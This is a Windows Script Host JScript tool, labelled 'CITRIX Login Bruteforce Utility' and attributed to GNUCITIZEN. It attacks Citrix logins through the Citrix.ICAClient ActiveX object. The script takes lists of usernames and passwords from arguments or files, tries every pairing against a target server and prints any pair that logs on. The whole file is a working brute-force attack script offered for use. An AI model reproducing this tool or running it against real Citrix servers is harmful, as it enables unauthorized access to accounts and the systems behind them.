var actns = [];
var pairs = [];
var parms = {};

var util = this;

var usernames = [];
var passwords = [];

var timeout = 5000;

if (WScript.Arguments.length < 3) {
	WScript.Echo('usage: ' + WScript.ScriptName + ' key=value key=value key=value ...');
	WScript.Echo('       ' + WScript.ScriptName + ' TCPBrowserAddress=172.16.3.191 usernames=user1,user2 passwords=pass1,pass2');
	WScript.Echo('       ' + WScript.ScriptName + ' HTTPBrowserAddress=172.16.3.191 userfile=file.txt passfile=file.txt');
	WScript.Echo('       ' + WScript.ScriptName + ' TCPBrowserAddress=172.16.3.191 usernames=user1,user2 passwords=pass1,pass2 timeout=5000');
	WScript.Echo('');
	WScript.Echo('CITRIX Login Bruteforce Utility');
	WScript.Echo('by Petko D. Petkov (pdp) GNUCITIZEN (http://www.gnucitizen.org)');
	WScript.Quit(1);
} else {
	var try_out = WScript.CreateObject('Citrix.ICAClient');

	for (var i = 0; i < WScript.Arguments.length; i++) {
		var arg = WScript.Arguments(i);
		var tkn = arg.split('=');

		try {
			var name = tkn[0].replace(/^\s+|\s+$/g, '');
			var value = tkn[1].replace(/^\s+|\s+$/g, '');

			switch (name) {
				case 'timeout':
					try {
						timeout = int(value);
					} catch (e) {
						WScript.Echo("option 'timeout' must be an integer value");
					}

					break;
				case 'usernames':
					var items = value.split(',');

					for (var z = 0; z < items.length; z++) {
						usernames.push(items[z].replace(/^\s+|\s+$/g, ''));
					}

					break;
				case 'passwords':
					var items = value.split(',');

					for (var z = 0; z < items.length; z++) {
						passwords.push(items[z].replace(/^\s+|\s+$/g, ''));
					}

					break;
				case 'userfile':
					try {
						var fso = WScript.CreateObject('Scripting.FileSystemObject');
						var f = fso.OpenTextFile(value, 1);

						while (!f.AtEndOfStream) {
							var line = f.ReadLine();
							usernames.push(line.replace(/^\s+|\s+$/g, ''));
						}

						f.Close();
					} catch (e) {
						WScript.Echo(e.message);
						WScript.Quit(1);
					}

					break;
				case 'passfile':
					try {
						var fso = WScript.CreateObject('Scripting.FileSystemObject');
						var f = fso.OpenTextFile(value, 1);

						while (!f.AtEndOfStream) {
							var line = f.ReadLine();
							passwords.push(line.replace(/^\s+|\s+$/g, ''));
						}

						f.Close();
					} catch (e) {
						WScript.Echo(e.message);
						WScript.Quit(1);
					}

					break;
				default:
					try_out.SetProp(name, value);
					parms[name] = value;
			}

		} catch (e) {
			WScript.Echo("option '" + arg + "' not recognized");
			WScript.Quit(1);
		}
	}
}

function frap(f) {
	var a = [];
	
	for (var i = 1; i < arguments.length; i++) {
		a.push(arguments[i]);
	}
		
	return function () {
		f.apply(f, a);
	};
}

for (var i = 0; i < usernames.length; i++) {
	for (var z = 0; z < passwords.length; z++) {
		pairs.push([usernames[i], passwords[z]]);
	}
}

for (var i = 0; i < pairs.length; i++) {
	actns.push(frap(function (i) {
		util['_cls' + i] = WScript.CreateObject('Citrix.ICAClient', '_ica' + i);
		util['_ica' + i + 'OnLogon'] = frap(function (i) {
			WScript.Echo(pairs[i]);
			util['_cls' + i].Disconnect();
		}, i);

		for (var z in parms) {
			util['_cls' + i].setProp(z, parms[z]);
		}

		util['_cls' + i].setProp('UserName', pairs[i][0]);
		util['_cls' + i].setProp('Password', pairs[i][1]);
		util['_cls' + i].setProp('Launch', 'TRUE');
		util['_cls' + i].Connect();

		actns.push(frap(function (i) {
			util['_cls' + i].Disconnect();
		}, i));
	}, i));
}

while(1) {
	var action = actns.pop();

	if (action) {
		action();
	} else {
		WScript.Quit(0);
	}

	WScript.Sleep(timeout);
}
